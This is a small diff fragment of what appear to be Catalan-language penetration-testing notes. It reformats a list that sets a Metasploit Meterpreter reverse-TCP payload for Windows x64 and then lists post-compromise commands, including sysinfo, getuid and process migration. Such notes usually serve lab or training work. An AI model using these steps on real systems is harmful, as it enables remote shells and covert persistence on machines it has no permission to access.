@@ -12,9 +12,8 @@
 * i payload `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
 
 Ja estem dins...
-
- Comandaments:
-    * sysinfo
+* Comandaments:
+   * sysinfo
     * pwd
     * getuid
     * migrate pid 
